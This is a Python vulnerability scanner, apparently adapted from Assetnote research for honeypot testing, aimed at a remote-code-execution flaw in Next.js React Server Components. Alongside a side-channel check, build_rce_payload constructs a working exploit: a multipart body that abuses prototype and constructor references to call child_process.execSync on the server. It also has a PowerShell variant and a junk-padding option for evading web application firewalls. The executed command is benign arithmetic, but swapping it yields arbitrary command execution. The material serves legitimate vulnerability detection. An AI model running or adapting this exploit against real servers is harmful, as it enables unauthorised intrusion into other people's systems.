#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
#     "tqdm>=4.64.0",
# ]
# ///
"""
React2Shell Scanner - High Fidelity Detection for RSC/Next.js RCE
CVE-2025-55182 & CVE-2025-66478

Based on research from Assetnote Security Research Team.
Original repository: https://github.com/assetnote/react2shell-scanner
Adapted for HoneyKube honeypot testing.
"""

import argparse
import sys
import json
import random
import re
import string
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional, Tuple

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║           React2Shell Scanner - CVE-2025-55182               ║
║                  Next.js RSC RCE Scanner                     ║
║           brought to you by assetnote (adapted)              ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def normalize_host(host: str) -> str:
    host = host.strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = f"http://{host}"
    return host.rstrip("/")


def generate_junk_data(size_bytes: int) -> tuple[str, str]:
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk


def build_safe_payload() -> tuple[str, str]:
    """Build safe side-channel detection payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        cmd = 'powershell -c \\\"41*271\\\"'
    else:
        cmd = 'echo $((41*271))'

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool) -> Tuple[Optional[requests.Response], Optional[str]]:
    try:
        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as e:
        return None, f"Request failed: {str(e)}"


def is_vulnerable_safe_check(response: requests.Response) -> bool:
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False
    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = has_netlify_vary or server_header in ("netlify", "vercel")
    return not is_mitigated


def is_vulnerable_rce_check(response: requests.Response) -> bool:
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))


def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = False, 
                       safe_check: bool = False, windows: bool = False,
                       waf_bypass: bool = False, paths: Optional[list] = None) -> dict:
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "request": None,
        "response": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

    host = normalize_host(host)
    if not host:
        result["error"] = "Invalid or empty host"
        return result

    test_paths = paths if paths else ["/"]

    if safe_check:
        body, content_type = build_safe_payload()
        is_vulnerable = is_vulnerable_safe_check
    else:
        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass)
        is_vulnerable = is_vulnerable_rce_check

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    for path in test_paths:
        if not path.startswith("/"):
            path = "/" + path
        
        test_url = f"{host}{path}"
        
        # Build raw request for logging
        parsed = urlparse(test_url)
        req_str = f"POST {path} HTTP/1.1\r\n"
        req_str += f"Host: {parsed.netloc}\r\n"
        for k, v in headers.items():
            req_str += f"{k}: {v}\r\n"
        req_str += f"Content-Length: {len(body)}\r\n\r\n"
        req_str += body
        result["request"] = req_str

        response, error = send_payload(test_url, headers, body, timeout, verify_ssl)

        if error:
            if not safe_check and error == "Request timed out":
                result["vulnerable"] = False
                result["error"] = error
                continue
            result["error"] = error
            continue

        result["status_code"] = response.status_code
        
        # Build raw response
        resp_str = f"HTTP/1.1 {response.status_code} {response.reason}\r\n"
        for k, v in response.headers.items():
            resp_str += f"{k}: {v}\r\n"
        resp_str += f"\r\n{response.text[:2000]}"
        result["response"] = resp_str

        if is_vulnerable(response):
            result["vulnerable"] = True
            return result

    result["vulnerable"] = False
    return result


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell Scanner - Next.js RSC RCE (CVE-2025-55182)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--safe-check", action="store_true", help="Use safe side-channel detection")
    parser.add_argument("--windows", action="store_true", help="Use Windows PowerShell payload")
    parser.add_argument("--waf-bypass", action="store_true", help="Add junk data for WAF bypass")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output file for results (JSON)")

    args = parser.parse_args()

    print_banner()

    print(colorize(f"[*] Target: {args.url}", Colors.CYAN))
    print(colorize(f"[*] Mode: {'Safe Check' if args.safe_check else 'RCE PoC'}", Colors.CYAN))
    if args.windows:
        print(colorize("[*] Using Windows payload", Colors.CYAN))
    print()

    result = check_vulnerability(
        args.url,
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        safe_check=args.safe_check,
        windows=args.windows,
        waf_bypass=args.waf_bypass
    )

    if result["vulnerable"] is True:
        print(colorize(f"[VULNERABLE] {args.url}", Colors.RED + Colors.BOLD))
    elif result["vulnerable"] is False:
        print(colorize(f"[NOT VULNERABLE] {args.url}", Colors.GREEN))
    else:
        print(colorize(f"[ERROR] {args.url} - {result.get('error', 'Unknown')}", Colors.YELLOW))

    if args.verbose and result.get("response"):
        print(colorize("\n[Response Preview]:", Colors.CYAN))
        print(result["response"][:500])

    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {args.output}", Colors.GREEN))


if __name__ == "__main__":
    main()
